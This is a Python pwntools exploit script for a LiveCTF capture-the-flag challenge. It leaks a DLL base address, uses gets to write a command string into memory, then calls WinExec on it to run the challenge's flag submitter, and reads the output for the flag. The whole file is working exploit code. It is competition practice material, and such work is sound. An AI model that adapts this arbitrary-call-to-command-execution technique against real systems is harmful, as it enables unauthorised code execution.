import sys
from time import sleep

LOCAL = "LOCAL" in sys.argv
#LOCAL = True

from pwn import *

BIN_NAME = ['wine', "challenge.exe"]
REMOTE_ADDR = os.environ.get('HOST', 'localhost')
REMOTE_PORT = 31337

if LOCAL: stream = process(BIN_NAME, cwd="../handout")
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)

sleep(1)
stream.sendline(b"msvcrt.dll")

stream.recvuntil(b"Module handle: ")
base = int(stream.recvline()[:-2], 16)
print("base: " + hex(base))

stream.sendline(b"gets")

sleep(0.5)
addr_cmd = base + 0x70000
stream.sendline(str(addr_cmd).encode())

sleep(0.5)
stream.sendline(b"/home/livectf/submitter")

sleep(0.5)
stream.sendline(b"kernel32.dll")

sleep(0.5)
stream.sendline(b"WinExec")

sleep(0.5)
stream.sendline(str(addr_cmd).encode())

print(stream.recv())
print(stream.recv())
print(stream.recv())
print(stream.recvline())
print(stream.recvline())
print(stream.recvline())
exit()

if LOCAL:
  stream.interactive()
else:
  sleep(1)
  stream.sendline(b"./submitter")
  while True:
    try:
      flag = stream.recvline()
      print(flag)
      if b'LiveCTF{' not in flag: continue
      print(flag.strip().decode())
      break
    except Exception as e:
      print(e)
